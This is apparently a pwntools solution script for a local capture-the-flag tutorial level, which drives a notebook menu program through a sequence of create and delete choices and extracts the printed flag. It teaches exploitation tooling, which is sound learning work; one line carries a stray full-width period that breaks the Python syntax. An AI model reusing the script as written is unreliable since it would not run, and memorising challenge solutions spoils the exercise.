from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")

# excute
challenge_path = "/challenge/pwntools-tutorials-level3.0"
elf = ELF(challenge_path)
p = process(elf.path)

# create string
p.sendlineafter("Choice >> \n",b'1')
p.sendlineafter("Input your notebook index:\n",b'0')
p.sendafter("Input your notebook content:\n",b'hello ')

p.sendlineafter("Choice >> \n",b'1')
p.sendlineafter("Input your notebook index:\n",b'1')
p.sendafter("Input your notebook content:\n",b'world,')
p.sendlineafter("Choice >> \n",b'2')
p.sendlineafter("Input your notebook index:\n",b'1')

p.sendlineafter("Choice >> \n",b'1')。
p.sendlineafter("Input your notebook index:\n",b'3')
p.sendafter("Input your notebook content:\n",b'magic ')

p.sendlineafter("Choice >> \n",b'1')
p.sendlineafter("Input your notebook index:\n",b'5')
p.sendafter("Input your notebook content:\n",b'notebook')
p.sendlineafter("Choice >> \n",b'2')
p.sendlineafter("Input your notebook index:\n",b'5')

p.sendlineafter("Choice >> \n",b'5')

# 接收题目的输出
#flag = p.recvline().strip()
# 打印题目的输出
#print(f"flag is: {flag}")
# get flag
#flag = p.recvline()
#print(f"flag is: {flag}")

# 调用赠送礼物功能，触发read_flag()函数并捕获标准输出 
flag_output = p.recvall(timeout=1).decode() 
# 提取flag的内容并打印到终端上 
flag_start = flag_output.find("flag{") 
flag_end = flag_output.find("}") 
if flag_start != -1 and flag_end != -1: 
    flag = flag_output[flag_start:flag_end + 1] 
    print("Flag:", flag) 
else: 
    print("Flag not found in the output.") 
p.close()